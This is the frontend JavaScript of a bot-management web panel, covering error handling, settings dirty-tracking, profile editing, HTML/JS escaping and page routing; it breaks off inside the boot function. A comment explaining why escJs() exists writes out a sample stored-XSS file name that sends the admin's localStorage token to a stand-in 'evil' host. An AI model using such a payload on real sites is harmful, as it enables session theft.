'use strict';
/**
 * Nexus Bot Manager — Frontend SPA
 * Single-page application — no full reloads, async updates only.
 */

// -- Global translation helper -------------------------------
// `t()` is available everywhere in the SPA so individual render functions
// don't have to redeclare `const t = ...` at the top of every scope. This
// also eliminates the "t is not defined" crash when a render function is
// called before its local scope binding runs.
window.t = function t(key, params) {
  try {
    if (window.NexusI18n && typeof window.NexusI18n.t === 'function') {
      return window.NexusI18n.t(key, params);
    }
  } catch (_) { /* fall through */ }
  // Last-resort fallback: return the key so the developer notices the
  // missing translation, but never throw a TypeError that crashes the UI.
  return (key == null ? '' : String(key));
};

// -- Global Error Boundary ----------------------------------
// Prevent any uncaught JavaScript error from turning the whole UI
// into a blank page. Errors are surfaced in a dismissable toast AND
// rendered inline in the active page so the rest of the app keeps
// working. This is the safety net the wizard / new-bot / npm pages
// lacked in v1.1.1.
(function installGlobalErrorBoundary() {
  function safeString(v) {
    try { return String(v == null ? '' : v); } catch (_) { return '<unstringifiable>'; }
  }

  function showFatalInPage(err) {
    const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
    const main = document.getElementById('content') || document.body;
    // Pick the currently visible page
    const page = main.querySelector('.page.active') || main.querySelector('.page');
    const target = page || main;
    const where = err && err.where ? err.where : t('common.error');
    const msg = err && err.message ? err.message : safeString(err);
    target.innerHTML = `
      <div class="card" style="margin:32px auto;max-width:560px;">
        <div class="empty-state" style="padding:32px 24px;">
          <i class="ti ti-alert-triangle" style="font-size:40px;color:var(--red);"></i>
          <div class="empty-state-title">${safeString(where)}</div>
          <div class="empty-state-desc" style="font-family:var(--font-mono);font-size:12px;text-align:left;max-width:480px;">${safeString(msg)}</div>
          <div style="margin-top:14px;display:flex;gap:8px;justify-content:center;">
            <button class="btn btn-ghost" onclick="location.reload()"><i class="ti ti-refresh"></i> ${safeString(t('common.refresh') || 'Refresh')}</button>
          </div>
        </div>
      </div>`;
  }

  function showFatalToast(err) {
    const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
    const msg = err && err.message ? err.message : safeString(err);
    try { toast('error', t('errors.generic') || 'Error', msg || t('errors.genericDesc') || ''); }
    catch (_) { /* toast may not exist yet */ }
  }

  window.addEventListener('error', (e) => {
    // Ignore non-fatal script-load failures (we surface them differently)
    if (!e || !e.error) return;
    const err = { where: 'Unhandled error', message: e.error && e.error.message ? e.error.message : String(e.message || 'Unknown error'), stack: e.error && e.error.stack };
    console.error('[Nexus] uncaught', err);
    showFatalInPage(err);
    showFatalToast(err);
  });

  window.addEventListener('unhandledrejection', (e) => {
    if (!e || !e.reason) return;
    const r = e.reason;
    const err = { where: 'Unhandled promise rejection', message: (r && r.message) ? r.message : safeString(r), stack: r && r.stack };
    console.error('[Nexus] unhandled rejection', err);
    showFatalInPage(err);
    showFatalToast(err);
  });
})();

// -- Global State -------------------------------------------
const App = {
  bots: [],
  systemInfo: null,
  settings: {},
  currentPage: 'dashboard',
  currentBotName: null,
  socket: null,
  pm2StatusMap: {},          // name -> pm2 status object (live from socket)
  refreshTimers: {},
  instanceName: 'Nexus Bot Manager',
  localVersion: null,        // Cached from /api/update/version
  updateAvailable: false,    // Cached for sidebar indicator
  // Each entry maps a dirty form group to the settings section it belongs
  // to. Groups are finer than sections because General has two Save buttons.
  settingsDirty: new Map(),
  settingsSnapshot: null,
  currentSettingsSection: 'general',
  bulkActionRunning: false,
  botDirty: new Set(),
  suppressUnloadGuard: false,
};

// ------------------------------------------------------------
// UNSAVED-CHANGES GUARD
// ------------------------------------------------------------
const SETTINGS_SECTION_IDS = ['general', 'account', 'appearance', 'language', 'bots-cfg', 'users', 'webhooks', 'export', 'mcp', 'software', 'about'];

const MCP_SCOPE_GROUPS = [
  { id: 'bots', scopes: ['bots_read', 'bots_write'] },
  { id: 'files', scopes: ['files_read', 'files_write'] },
  { id: 'env', scopes: ['env_read', 'env_write'] },
  { id: 'packages', scopes: ['packages_read', 'packages_write'] },
  { id: 'snapshots', scopes: ['snapshots_read', 'snapshots_write'] },
  { id: 'sensitive', scopes: ['users', 'webhooks', 'settings', 'exports'] }
];
const MCP_SCOPE_DEFAULTS = {
  bots_read: true, bots_write: true,
  files_read: true, files_write: true,
  env_read: true, env_write: true,
  packages_read: true, packages_write: true,
  snapshots_read: true, snapshots_write: false,
  users: false, webhooks: false, settings: false, exports: false
};

function mcpScopeEnabled(scopes, id) {
  if (!scopes || typeof scopes !== 'object') return MCP_SCOPE_DEFAULTS[id] === true;
  return scopes[id] === undefined ? MCP_SCOPE_DEFAULTS[id] === true : scopes[id] === true;
}

const SETTINGS_DIRTY_GROUPS = {
  's-name': 'general-name',
  's-autorestart': 'general-bots',
  's-maxrestart': 'general-bots',
  's-curpwd': 'account',
  's-newpwd': 'account',
  's-cfpwd': 'account',
  's-monint': 'bots-cfg',
  's-notif': 'bots-cfg',
  'mcp-enabled': 'mcp'
};

function settingsGroupForInput(el) {
  const section = el && el.closest ? el.closest('.settings-section') : null;
  if (!section) return null;
  const sectionId = section.id.replace(/^section-/, '');
  return {
    group: SETTINGS_DIRTY_GROUPS[el.id] || sectionId,
    section: sectionId
  };
}

function updateSettingsDirtyBadge() {
  const badge = document.getElementById('settings-dirty-badge');
  if (badge) badge.style.display = App.settingsDirty.size ? '' : 'none';
}

function markSettingsDirty(el) {
  const info = settingsGroupForInput(el);
  if (!info) return;
  App.settingsDirty.set(info.group, info.section);
  updateSettingsDirtyBadge();
}

function markSettingsGroupsClean(groups) {
  groups.forEach(group => App.settingsDirty.delete(group));
  updateSettingsDirtyBadge();
}

function markSettingsClean() {
  App.settingsDirty.clear();
  App.settingsSnapshot = null;
  updateSettingsDirtyBadge();
}

function dirtySettingsGroupsInSection(sectionId) {
  const groups = [];
  App.settingsDirty.forEach((section, group) => {
    if (section === sectionId) groups.push(group);
  });
  return groups;
}

/**
 * Remember the values rendered from the server so that leaving a dirty
 * settings tab can restore them instead of silently keeping unsaved edits.
 */
function captureSettingsSnapshot() {
  const snapshot = new Map();
  document.querySelectorAll('#page-settings .settings-section input, #page-settings .settings-section select, #page-settings .settings-section textarea').forEach(el => {
    const info = settingsGroupForInput(el);
    if (!info) return;
    if (!snapshot.has(info.group)) snapshot.set(info.group, []);
    snapshot.get(info.group).push({ el, value: el.value, checked: el.checked });
  });
  App.settingsSnapshot = snapshot;
}

function refreshSettingsGroupsSnapshot(groups) {
  if (!App.settingsSnapshot) return;
  const wanted = new Set(groups);
  groups.forEach(group => App.settingsSnapshot.set(group, []));
  document.querySelectorAll('#page-settings .settings-section input, #page-settings .settings-section select, #page-settings .settings-section textarea').forEach(el => {
    const info = settingsGroupForInput(el);
    if (!info || !wanted.has(info.group)) return;
    const entries = App.settingsSnapshot.get(info.group);
    if (entries) entries.push({ el, value: el.value, checked: el.checked });
  });
}

function discardSettingsGroups(groups) {
  groups.forEach(group => {
    const entries = (App.settingsSnapshot && App.settingsSnapshot.get(group)) || [];
    entries.forEach(({ el, value, checked }) => {
      if (!el.isConnected) return;
      if (el.type === 'checkbox' || el.type === 'radio') el.checked = checked;
      else el.value = value;
    });
    App.settingsDirty.delete(group);
  });
  // The MCP panel is re-rendered after a token rotation, which detaches
  // the elements captured above. Fall back to the saved setting value.
  if (groups.includes('mcp')) {
    const checkbox = document.getElementById('mcp-enabled');
    if (checkbox) checkbox.checked = !!(App.settings && App.settings.mcp_enabled);
  }
  updateSettingsDirtyBadge();
}

function botDirtyGroupForInput(el) {
  if (!el || !el.closest || !el.closest('#page-bot')) return null;
  // Controls that trigger an immediate server action rather than a form save.
  if (el.id === 'env-show-secrets' || el.id === 'snapshot-label') return null;
  if (el.closest('#env-rows') || el.classList.contains('env-key') || el.classList.contains('env-value')) return 'bot-env';
  return 'bot-custom';
}

function markBotDirty(group = 'bot-custom') {
  App.botDirty.add(group);
}

function markBotClean(groups = null) {
  if (groups) groups.forEach(group => App.botDirty.delete(group));
  else App.botDirty.clear();
}

function showUnsavedChangesDialog(onLeave, options = {}) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  if (document.getElementById('unsaved-changes-modal')) return;
  const desc = options.desc || _t('settingsPage.unsavedDesc');
  const leaveLabel = options.leaveLabel || _t('settingsPage.unsavedLeave');
  const ov = document.createElement('div');
  ov.id = 'unsaved-changes-modal';
  ov.className = 'modal-overlay';
  ov.innerHTML = `<div class="modal modal-sm">
    <div class="modal-header">
      <span class="modal-title"><i class="ti ti-alert-triangle" style="color:var(--amber);"></i>${esc(_t('settingsPage.unsavedTitle'))}</span>
      <button class="btn-close" id="unsaved-close"><i class="ti ti-x"></i></button>
    </div>
    <div class="modal-body">
      <p style="font-size:13px;color:var(--tx-2);line-height:1.6;">${esc(desc)}</p>
    </div>
    <div class="modal-footer">
      <button class="btn btn-ghost" id="unsaved-stay">${esc(_t('settingsPage.unsavedStay'))}</button>
      <button class="btn btn-danger" id="unsaved-leave">${esc(leaveLabel)}</button>
    </div>
  </div>`;
  document.body.appendChild(ov);
  const close = () => ov.remove();
  ov.querySelector('#unsaved-close').onclick = close;
  ov.querySelector('#unsaved-stay').onclick = close;
  ov.querySelector('#unsaved-leave').onclick = () => {
    close();
    onLeave();
  };
  ov.onclick = e => { if (e.target === ov) close(); };
}

function currentPageHasUnsavedChanges(targetPage) {
  // Re-rendering the settings page also replaces every field, so staying on
  // the same page still loses unsaved edits.
  if (App.currentPage === 'settings' && App.settingsDirty.size) return true;
  // Any navigation away from the bot page, including a same-bot re-render,
  // replaces the form and would lose edits.
  if (App.currentPage === 'bot' && App.botDirty.size) return true;
  return false;
}

function onSettingsFieldEdited(el) {
  if (!el || !el.matches || !el.matches('input, select, textarea')) return;
  if (el.readOnly || el.disabled) return;
  // File pickers trigger an immediate upload/import, not a form draft.
  if (el.type === 'file') return;
  if (el.closest('#page-settings')) markSettingsDirty(el);
  const botGroup = botDirtyGroupForInput(el);
  if (botGroup) markBotDirty(botGroup);
}

document.addEventListener('input', e => onSettingsFieldEdited(e.target));
document.addEventListener('change', e => onSettingsFieldEdited(e.target));

window.addEventListener('beforeunload', e => {
  if (App.suppressUnloadGuard) return;
  if (!App.settingsDirty.size && !App.botDirty.size) return;
  e.preventDefault();
  e.returnValue = '';
});

// ------------------------------------------------------------
// USER PROFILE / ROLE
// ------------------------------------------------------------
function currentUser() {
  return NexusAuth.getUser();
}

function isAdmin() {
  const user = currentUser();
  return !!user && user.role === 'admin';
}

function applyRoleVisibility() {
  const user = currentUser();
  const admin = !!user && user.role === 'admin';
  document.querySelectorAll('[data-admin-only]').forEach(el => {
    el.classList.toggle('role-hidden', !admin);
  });
  const roleEl = document.getElementById('sb-user-role');
  if (roleEl && user) {
    roleEl.textContent = admin
      ? (window.NexusI18n ? NexusI18n.t('sidebar.sbRole') : 'Administrateur')
      : (window.NexusI18n ? NexusI18n.t('profile.roleUser') : 'Utilisateur');
  }
}

function avatarImageHtml(src, alt = '') {
  if (!src) return '';
  return `<img src="${esc(src)}" alt="${esc(alt)}" style="width:100%;height:100%;border-radius:inherit;object-fit:cover;"/>`;
}

function applyUserProfile(user) {
  if (!user) return;
  const merged = { ...(currentUser() || {}), ...user };
  NexusAuth.setUser(merged);
  const display = merged.display_name || merged.username || '';
  const initials = botInitials(display || merged.username || '?');

  const av = document.getElementById('sb-user-avatar');
  if (av) av.innerHTML = merged.avatar ? avatarImageHtml(merged.avatar, display) : esc(initials);
  const nm = document.getElementById('sb-user-name');
  if (nm) nm.textContent = display;
  const roleEl = document.getElementById('sb-user-role');
  if (roleEl) {
    roleEl.textContent = merged.role === 'admin'
      ? (window.NexusI18n ? NexusI18n.t('sidebar.sbRole') : 'Administrateur')
      : (window.NexusI18n ? NexusI18n.t('profile.roleUser') : 'Utilisateur');
  }

  // Keep the Settings > Account summary in sync after a profile save.
  const cardName = document.getElementById('account-profile-name');
  if (cardName) cardName.textContent = display;
  const cardUser = document.getElementById('account-profile-username');
  if (cardUser) cardUser.textContent = '@' + (merged.username || '');
  const cardAv = document.getElementById('account-profile-avatar');
  if (cardAv) cardAv.innerHTML = merged.avatar ? avatarImageHtml(merged.avatar, display) : esc(initials);

  applyRoleVisibility();
}

/**
 * Resize an image file to a square JPEG/PNG data URL. Used by both the
 * profile editor and the setup wizard.
 */
function readSquareImage(input, size, onReady) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const file = input.files && input.files[0];
  if (!file) return;
  if (!/^image\/(png|jpeg|webp|gif)$/i.test(file.type)) {
    toast('error', _t('botCustom.invalidImage'), _t('botCustom.invalidImageHint'));
    input.value = '';
    return;
  }
  if (file.size > 5 * 1024 * 1024) {
    toast('error', _t('botCustom.imageTooLarge'), _t('botCustom.imageTooLargeHint'));
    input.value = '';
    return;
  }
  const reader = new FileReader();
  reader.onload = () => {
    const img = new Image();
    img.onload = () => {
      const canvas = document.createElement('canvas');
      canvas.width = size; canvas.height = size;
      const ctx = canvas.getContext('2d');
      const scale = Math.min(size / img.width, size / img.height);
      const w = img.width * scale;
      const h = img.height * scale;
      ctx.drawImage(img, (size - w) / 2, (size - h) / 2, w, h);
      onReady(canvas.toDataURL('image/png'));
    };
    img.onerror = () => toast('error', _t('botCustom.invalidImage'));
    img.src = String(reader.result);
  };
  reader.readAsDataURL(file);
  input.value = '';
}

// -- Profile modal (available to every signed-in account) ---
let _profileAvatarDraft = null;

function closeProfileModal() {
  document.getElementById('profile-modal')?.remove();
}

function showProfileModal() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const user = currentUser();
  if (!user) return;
  closeProfileModal();
  _profileAvatarDraft = user.avatar || null;
  const display = user.display_name || user.username || '';
  const initials = botInitials(display);
  const avHtml = user.avatar ? avatarImageHtml(user.avatar, display) : esc(initials);
  const lang = user.language || (window.NexusI18n ? NexusI18n.current() : 'en');

  const ov = document.createElement('div');
  ov.id = 'profile-modal';
  ov.className = 'modal-overlay';
  ov.innerHTML = `<div class="modal" style="max-width:560px;">
    <div class="modal-header">
      <span class="modal-title"><i class="ti ti-user-circle"></i>${esc(_t('profile.title'))}</span>
      <button class="btn-close" onclick="closeProfileModal()"><i class="ti ti-x"></i></button>
    </div>
    <div class="modal-body">
      <p class="form-hint" style="margin-bottom:14px;">${esc(_t('profile.subtitle'))}</p>
      <div class="profile-editor">
        <div class="profile-avatar-lg" id="profile-avatar-preview">${avHtml}</div>
        <div class="profile-editor-actions">
          <input type="file" id="profile-avatar-input" accept="image/png,image/jpeg,image/webp,image/gif" style="display:none" onchange="profileAvatarPicked(this)"/>
          <button class="btn btn-ghost btn-sm" type="button" onclick="document.getElementById('profile-avatar-input').click()"><i class="ti ti-upload"></i>${esc(_t('profile.chooseAvatar'))}</button>
          <button class="btn btn-ghost btn-sm" type="button" onclick="profileAvatarRemove()"><i class="ti ti-x"></i>${esc(_t('profile.removeAvatar'))}</button>
          <div class="form-hint" style="margin-top:4px;">${esc(_t('profile.avatarHint'))}</div>
        </div>
      </div>
      <div class="form-group">
        <label class="form-label">${esc(_t('profile.displayName'))}</label>
        <input class="form-control" id="profile-display-name" maxlength="80" value="${esc(display)}"/>
      </div>
      <div class="grid-2">
        <div class="form-group">
          <label class="form-label">${esc(_t('profile.username'))}</label>
          <input class="form-control mono" value="${esc(user.username || '')}" disabled/>
          <div class="form-hint">${esc(_t('profile.usernameHint'))}</div>
        </div>
        <div class="form-group">
          <label class="form-label">${esc(_t('profile.language'))}</label>
          <select class="form-control" id="profile-language">
            ${['en', 'fr', 'de'].map(code => `<option value="${code}"${code === lang ? ' selected' : ''}>${esc(window.NexusI18n ? NexusI18n.supportedNames[code] : code)}</option>`).join('')}
          </select>
        </div>
      </div>
      <div class="profile-danger-zone">
        <button class="btn btn-ghost btn-sm" type="button" onclick="signOutEverywhere()"><i class="ti ti-logout"></i>${esc(_t('profile.signOutAll'))}</button>
        <span class="form-hint">${esc(_t('profile.signOutAllHint'))}</span>
      </div>
    </div>
    <div class="modal-footer" style="justify-content:space-between;">
      <button class="btn btn-ghost" type="button" onclick="closeProfileModal();requestLogout()"><i class="ti ti-logout"></i>${esc(_t('profile.signOut'))}</button>
      <div class="flex gap-8">
        <button class="btn btn-ghost" type="button" onclick="closeProfileModal()">${esc(_t('common.cancel'))}</button>
        <button class="btn btn-primary" id="profile-save" type="button" onclick="saveProfileModal()"><i class="ti ti-device-floppy"></i>${esc(_t('common.save'))}</button>
      </div>
    </div>
  </div>`;
  document.body.appendChild(ov);
  ov.onclick = e => { if (e.target === ov) closeProfileModal(); };
}

function profileAvatarPicked(input) {
  readSquareImage(input, 256, dataUrl => {
    _profileAvatarDraft = dataUrl;
    const preview = document.getElementById('profile-avatar-preview');
    if (preview) preview.innerHTML = avatarImageHtml(dataUrl, '');
  });
}

function profileAvatarRemove() {
  _profileAvatarDraft = null;
  const user = currentUser() || {};
  const preview = document.getElementById('profile-avatar-preview');
  if (preview) preview.textContent = botInitials(user.display_name || user.username || '?');
}

function signOutEverywhere() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  confirm(_t('profile.signOutAllConfirm'), _t('profile.signOutAllDesc'), async () => {
    try { await NexusAPI.auth.logoutAll(); } catch (_) {}
    closeProfileModal();
    doLogout();
  });
}

async function saveProfileModal() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const name = document.getElementById('profile-display-name')?.value?.trim();
  const language = document.getElementById('profile-language')?.value;
  if (!name) { toast('error', _t('profile.invalidName')); return; }
  const btn = document.getElementById('profile-save');
  if (btn) { btn.disabled = true; btn.innerHTML = '<span class="spinner spinner-sm"></span>'; }
  try {
    const updated = await NexusAPI.auth.updateProfile({
      display_name: name,
      avatar: _profileAvatarDraft,
      language
    });
    applyUserProfile(updated);
    closeProfileModal();
    if (language && language !== NexusI18n.current()) {
      NexusI18n.setLang(language, { persist: true });
      applyLanguage(language);
    }
    toast('success', _t('profile.saved'));
  } catch (e) {
    toast('error', _t('profile.saveError'), e.message);
    if (btn) { btn.disabled = false; btn.innerHTML = `<i class="ti ti-device-floppy"></i>${esc(_t('common.save'))}`; }
  }
}

// ------------------------------------------------------------
// UTILITIES
// ------------------------------------------------------------
// Context-sensitive escaping. Two functions, because HTML and JavaScript
// are different languages and this app uses both.
//
// esc()  — for HTML text nodes and for double-quoted HTML attributes
//          (title="…", placeholder="…", value="…"). It also escapes '
//          and ` so a value can never terminate such an attribute.
//
// escJs() — REQUIRED inside an inline event handler:
//
//            onclick="openFile('${escJs(botName)}','${escJs(item.path)}')"
//
//          A browser HTML-DECODES an event-handler attribute value before
//          compiling it as JavaScript. HTML entity escaping is therefore
//          NOT enough there: &#39; collapses back to a raw apostrophe, the
//          JS string literal is terminated early, and the rest of the
//          value is compiled as code. That is the stored-XSS chain where a
//          bot plants a file named
//            x'-fetch('//evil/?t='+localStorage.nbm_token)-'.js
//          and clicking it hands the admin's own token to a third party.
//          escJs() backslash-escapes what matters to a JS string literal
//          and HTML-entities what matters to the attribute parser, so
//          neither layer can be escaped.
const ESC_MAP = {
  '&': '&amp;',
  '<': '&lt;',
  '>': '&gt;',
  '"': '&quot;',
  "'": '&#39;',
  '`': '&#96;'
};

function esc(s) {
  return String(s ?? '').replace(/[&<>"'`]/g, (c) => ESC_MAP[c]);
}

const JS_ESC_MAP = {
  '\\': '\\\\',
  "'":  "\\'",
  '`':  '\\`',
  '"':  '&quot;',
  '&':  '&amp;',
  '<':  '&lt;',
  '>':  '&gt;',
  '\n': '\\n',
  '\r': '\\r',
  '\u2028': '\\u2028',
  '\u2029': '\\u2029'
};

function escJs(s) {
  return String(s ?? '').replace(/[\\'"`&<>\n\r\u2028\u2029]/g, (c) => JS_ESC_MAP[c]);
}


function fmtUptime(ms) {
  if (!ms) return '—';
  const s = Math.floor((Date.now() - ms) / 1000);
  if (s < 60)    return `${s}s`;
  if (s < 3600)  return `${Math.floor(s/60)}m`;
  if (s < 86400) return `${Math.floor(s/3600)}h ${Math.floor((s%3600)/60)}m`;
  return `${Math.floor(s/86400)}j ${Math.floor((s%86400)/3600)}h`;
}

function fmtMem(mb) {
  if (!mb) return '0 Mo';
  return mb >= 1024 ? `${(mb/1024).toFixed(1)} Go` : `${mb} Mo`;
}

function fmtBytes(bytes) {
  const n = Number(bytes) || 0;
  if (n < 1024) return `${n} o`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} Ko`;
  if (n < 1024 * 1024 * 1024) return `${(n / (1024 * 1024)).toFixed(1)} Mo`;
  return `${(n / (1024 * 1024 * 1024)).toFixed(1)} Go`;
}

function fmtDate(iso) {
  if (!iso) return '—';
  return new Date(iso).toLocaleString('fr-FR', { dateStyle: 'short', timeStyle: 'short' });
}

function botInitials(name) {
  return name.split('-').map(w => (w[0] || '').toUpperCase()).join('').slice(0, 2) || '??';
}

function botDisplayName(bot) {
  if (!bot) return '';
  return bot.display_name || bot.name || '';
}

function botAvatarInner(bot) {
  if (bot && bot.avatar) {
    return `<img src="${esc(bot.avatar)}" alt="" style="width:100%;height:100%;object-fit:contain;padding:2px;border-radius:inherit;"/>`;
  }
  return botInitials((bot && bot.name) || '');
}

function mcpBadge(bot) {
  return bot && bot.mcp_exposed
    ? '<span class="badge badge-blue mcp-badge"><i class="ti ti-plug-connected"></i>MCP</span>'
    : '';
}

const COLORS = [
  ['rgba(37,99,235,0.15)','#58a6ff'],   ['rgba(63,185,80,0.15)','#3fb950'],
  ['rgba(210,153,34,0.15)','#d29922'],  ['rgba(248,81,73,0.15)','#f85149'],
  ['rgba(139,92,246,0.15)','#a78bfa'],  ['rgba(236,72,153,0.15)','#f472b6'],
  ['rgba(6,182,212,0.15)','#22d3ee'],   ['rgba(249,115,22,0.15)','#fb923c'],
];

function botColor(name) {
  let h = 0;
  for (const c of name) h = (h * 31 + c.charCodeAt(0)) % COLORS.length;
  return COLORS[h];
}

function statusBadge(pm2) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  if (!pm2) return `<span class="badge badge-unknown"><span class="badge-dot"></span>${esc(_t('status.unknown'))}</span>`;
  const map = {
    online:    `<span class="badge badge-online"><span class="badge-dot"></span>${esc(_t('status.online'))}</span>`,
    stopped:   `<span class="badge badge-stopped"><span class="badge-dot"></span>${esc(_t('status.stopped'))}</span>`,
    errored:   `<span class="badge badge-errored"><span class="badge-dot"></span>${esc(_t('status.errored'))}</span>`,
    stopping:  `<span class="badge badge-stopping"><span class="badge-dot"></span>${esc(_t('status.stopping'))}</span>`,
    launching: `<span class="badge badge-launching"><span class="badge-dot"></span>${esc(_t('status.launching'))}</span>`,
  };
  return map[pm2.status] || `<span class="badge badge-unknown"><span class="badge-dot"></span>${esc(pm2.status)}</span>`;
}

function fileIcon(name) {
  const ext = (name.split('.').pop() || '').toLowerCase();
  if (name === '.env' || name.endsWith('.env')) return '<i class="ti ti-lock fi-env"></i>';
  if (name === '.gitignore') return '<i class="ti ti-brand-git fi-dir"></i>';
  if (ext === 'js' || ext === 'mjs' || ext === 'cjs') return '<i class="ti ti-file-type-js fi-js"></i>';
  if (ext === 'ts') return '<i class="ti ti-brand-typescript fi-ts"></i>';
  if (ext === 'json') return '<i class="ti ti-file-type-json fi-json"></i>';
  if (ext === 'md') return '<i class="ti ti-markdown fi-md"></i>';
  if (ext === 'sh') return '<i class="ti ti-terminal" style="color:var(--tx-3)"></i>';
  if (ext === 'yaml' || ext === 'yml') return '<i class="ti ti-file-code" style="color:var(--amber)"></i>';
  return '<i class="ti ti-file" style="color:var(--tx-3)"></i>';
}

// ------------------------------------------------------------
// TOAST
// ------------------------------------------------------------
function toast(type, title, msg = '', duration = 4000) {
  const ICONS = { success:'ti-circle-check', error:'ti-alert-circle', warning:'ti-alert-triangle', info:'ti-info-circle' };
  const el = document.createElement('div');
  el.className = `toast ${type}`;
  el.innerHTML = `<i class="ti ${ICONS[type]||'ti-info-circle'} toast-icon"></i>
    <div><div class="toast-title">${esc(title)}</div>${msg ? `<div class="toast-msg">${esc(msg)}</div>` : ''}</div>`;
  document.getElementById('toast-container').appendChild(el);
  setTimeout(() => { el.style.cssText += 'opacity:0;transition:opacity 0.3s;'; setTimeout(() => el.remove(), 300); }, duration);
}

// ------------------------------------------------------------
// CONFIRM DIALOG
// ------------------------------------------------------------
function confirm(title, msg, onYes, danger = true) {
  const ov = document.createElement('div');
  ov.className = 'modal-overlay';
  ov.innerHTML = `<div class="modal modal-sm">
    <div class="modal-body" style="text-align:center;padding:28px 24px 16px;">
      <div style="font-size:32px;margin-bottom:12px;">${danger ? '<i class="ti ti-trash" style="color:var(--red);"></i>' : '<i class="ti ti-info-circle" style="color:var(--blue);"></i>'}</div>
      <div style="font-size:15px;font-weight:600;color:var(--tx-1);margin-bottom:8px;">${esc(title)}</div>
      <div style="font-size:13px;color:var(--tx-3);">${msg}</div>
    </div>
    <div class="modal-footer">
      <button class="btn btn-ghost" id="no">${esc(window.NexusI18n ? NexusI18n.t('confirmDialog.no') : 'Annuler')}</button>
      <button class="btn ${danger ? 'btn-danger' : 'btn-primary'}" id="yes">${esc(window.NexusI18n ? NexusI18n.t('confirmDialog.yes') : 'Confirmer')}</button>
    </div>
  </div>`;
  document.body.appendChild(ov);
  ov.querySelector('#no').onclick  = () => ov.remove();
  ov.querySelector('#yes').onclick = () => { ov.remove(); onYes(); };
  ov.onclick = e => { if (e.target === ov) ov.remove(); };
}

// ------------------------------------------------------------
// ROUTER
// ------------------------------------------------------------
function navigate(page, params = {}) {
  // Regular accounts have no access to the panel-wide admin pages, even if
  // the page is reached from a stale link or the developer console.
  if (!isAdmin() && ['new-bot', 'templates', 'backups', 'settings'].includes(page)) {
    page = 'dashboard';
    params = {};
  }
  if (currentPageHasUnsavedChanges(page, params)) {
    showUnsavedChangesDialog(() => {
      App.settingsDirty.clear();
      App.settingsSnapshot = null;
      App.botDirty.clear();
      updateSettingsDirtyBadge();
      navigate(page, params);
    });
    return;
  }
  // Stop any per-page refresh timers
  Object.values(App.refreshTimers).forEach(clearInterval);
  App.refreshTimers = {};

  App.currentPage = page;
  Object.assign(App.currentParams || {}, params);
  App.currentParams = params;

  // Sidebar active state
  document.querySelectorAll('.sb-item').forEach(el => el.classList.toggle('active', el.dataset.page === page));

  // Pages visibility
  document.querySelectorAll('.page, .page-editor').forEach(el => el.classList.remove('active'));

  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const PAGE_LABELS = {
    dashboard: _t('nav.dashboard'),
    bots:      _t('nav.bots'),
    'new-bot': _t('nav.newBot'),
    templates: _t('nav.templates'),
    editor:    _t('nav.editor'),
    files:     _t('nav.files'),
    logs:      _t('nav.logs'),
    npm:       _t('nav.npm'),
    backups:   _t('nav.backups'),
    settings:  _t('nav.settings'),
    bot:       _t('botDetail.title') || _t('nav.bots')
  };

  // Set breadcrumb
  const bc = document.getElementById('bc-current');
  if (bc) bc.textContent = PAGE_LABELS[page] || page;

  if (page === 'editor') {
    const el = document.getElementById('page-editor');
    if (el) el.classList.add('active');
    document.getElementById('content').style.overflow = 'hidden';
    if (typeof openEditorForBot === 'function' && params.botName) {
      openEditorForBot(params.botName, params.filePath, params.fileName);
    } else if (typeof openEditorForBot === 'function') {
      // No bot selected: render a translated empty state.
      const _t = window.NexusI18n ? NexusI18n.t.bind(window.NexusI18n) : (k) => k;
      el.innerHTML = `
        <div style="display:flex;align-items:center;justify-content:center;height:100%;padding:32px;">
          <div class="empty-state" style="max-width:380px;text-align:center;">
            <i class="ti ti-file-code" style="font-size:48px;color:var(--tx-3);margin-bottom:14px;"></i>
            <div class="empty-state-title">${_t('editor.emptyTitle')}</div>
            <div class="empty-state-desc">${_t('editor.emptyDesc')}</div>
            <button class="btn btn-primary btn-sm mt-8" onclick="navigate('bots')">
              <i class="ti ti-robot"></i>${_t('editor.openBotsList')}
            </button>
          </div>
        </div>`;
    }
  } else {
    document.getElementById('content').style.overflow = '';
    const el = document.getElementById('page-' + page);
    if (el) { el.classList.add('active'); renderPage(page, params); }
  }
}

function renderPage(page, params = {}) {
  switch (page) {
    case 'dashboard': loadDashboard(); break;
    case 'bots':      loadBotsList();  break;
    case 'bot':       loadBotDetail(params.botName); break;
    case 'new-bot':   renderNewBot(params); break;
    case 'templates': loadTemplates(); break;
    case 'files':     loadFilesPage(params); break;
    case 'logs':      loadLogs(params.botName); break;
    case 'npm':       loadNpm(params.botName);  break;
    case 'backups':   loadBackups();   break;
    case 'settings':  loadSettings(params.settingsSection); break;
    case 'help':      loadHelp();      break;
  }
}

// ------------------------------------------------------------
// AUTH & SETUP
// ------------------------------------------------------------
async function bootApp() {
  try {
    // Apply translations to the static chrome on first load (sidebar,
    // topbar, login page) before deciding which page to render, so the
    // user never sees hardcoded English if a different language was
    // restored from localStorage or the auth response.
    if (window.NexusI18n) {
      try { NexusI18n.apply(); } catch (_) {}
    }

    // 1. Check if setup is needed
    const status = await NexusAPI.auth.setupStatus();
    if (!status.done) {
      // The backend asks for a one-time bootstrap token before it will
      // create the first admin account.
      _setupNeedsToken = status.tokenRequired === true;
      _setupTermsVersion = status.termsVersion || '1.0';
      showSetup();
      return;
    }

    // 2. Check existing token
    const token = NexusAuth.getToken();
    if (token) {
      try {
        const me = await NexusAPI.auth.me();
        App.instanceName = me.instance_name || 'Nexus Bot Manager';
        if (me.language && window.NexusI18n) NexusI18n.setLang(me.language, { persist: true });
        applyUserProfile(me);
        updateInstanceName(App.instanceName);
        showApp();
        initSocket();
        navigate('dashboard');
        refreshVersionBadge(true);
        return;
      } catch (_) {
        NexusAuth.removeToken();
      }
    }

    showLogin();
  } catch (e) {
    // Server may be starting
    document.getElementById('boot-msg').textContent = 'Connexion au serveur...';
